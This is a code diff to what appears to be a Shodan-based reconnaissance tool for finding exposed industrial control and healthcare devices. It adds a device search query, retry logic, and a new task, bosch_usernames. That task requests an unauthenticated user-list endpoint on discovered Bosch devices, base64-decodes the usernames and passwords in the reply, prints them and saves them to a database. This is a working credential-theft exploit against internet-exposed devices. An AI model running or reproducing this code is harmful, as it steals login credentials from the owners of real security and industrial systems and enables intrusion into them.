@@ -16,13 +16,14 @@ import time
 from bs4 import BeautifulSoup
 import pynmea2
 import base64
+import xmltodict
 
 import urllib.parse
 import urllib.request
 import xml.etree.ElementTree as et
 
 from app_kamerka.models import Device, DeviceNearby, Search, TwitterNearby, FlickrNearby, ShodanScan, BinaryEdgeScore, \
-    Whois
+    Whois, Bosch
 
 healthcare_queries = {"zoll": "http.favicon.hash:-236942626",
                       'dicom': "dicom",
@@ -191,6 +192,7 @@ ics_queries = {"niagara": "port:1911,4911 product:Niagara",
                "simplex_grinnell": "http.html:SimplexGrinnell title:login",
                "bosch_security": "http.html:'Bosch Security'",
 
+                "other_hmi":"html:hmiBody",
                "fronius": "title:fronius",
                "webview": "http.favicon.hash:207964650",
                "Siemens Sm@rtClient": "title:'Siemens Sm@rtClient'",
@@ -533,8 +535,30 @@ def shodan_search_worker(fk, query, search_type, category, country=None, coordin
                 if country:
                     results = api.search("country:" + country + " " + query, page)
             except Exception as e:
+                print(e)
+
+        if fail == 1:
+            try:
+                time.sleep(10)
+                if coordinates:
+                    results = api.search("geo:" + coordinates + ",20 " + query, page)
+                if country:
+                    results = api.search("country:" + country + " " + query, page)
+            except Exception as e:
+                print(e)
+
+        if fail == 1:
+            try:
+                time.sleep(10)
+                if coordinates:
+                    results = api.search("geo:" + coordinates + ",20 " + query, page)
+                if country:
+                    results = api.search("country:" + country + " " + query, page)
+            except Exception as e:
                 results = False
                 print(e)
+
+
         try:
             total = results['total']
 
@@ -985,6 +1009,41 @@ def binary_edge_scan(id):
     device2 = BinaryEdgeScore(device=device1, grades=results['ip_score_detailed'], cve=cve, score=normalized_ip_score)
     device2.save()
 
+@shared_task(bind=False)
+def bosch_usernames(id):
+    device1 = Device.objects.get(id=id)
+    ip = device1.ip
+    port = device1.port
+
+    try:
+        req = requests.get("http://"+ip +":"+port+"/User.cgi?cmd=get_user")
+
+        xml = req.text
+
+        doc = xmltodict.parse(xml)
+        for user in doc['USER_SETTING']:
+            if user == 'result':
+                pass
+            else:
+                try:
+                    username = doc['USER_SETTING'][user]['USERNAME']
+                    pwd = doc['USER_SETTING'][user]['PWD']
+
+                    if username:
+                        decoded_username = base64.b64decode(username)
+                        decoded_pwd = base64.b64decode(pwd)
+                        print(decoded_pwd)
+                        print(decoded_username)
+                        bosch_model = Bosch(device=device1, username=decoded_username.decode("utf-8") , password=decoded_pwd.decode("utf-8") )
+                        bosch_model.save()
+                        return True
+                except Exception as e:
+                    print(str(e))
+                    return False
+
+    except Exception as e:
+        print(str(e.args))
+        return False
 
 @shared_task(bind=False)
 def whoisxml(id):
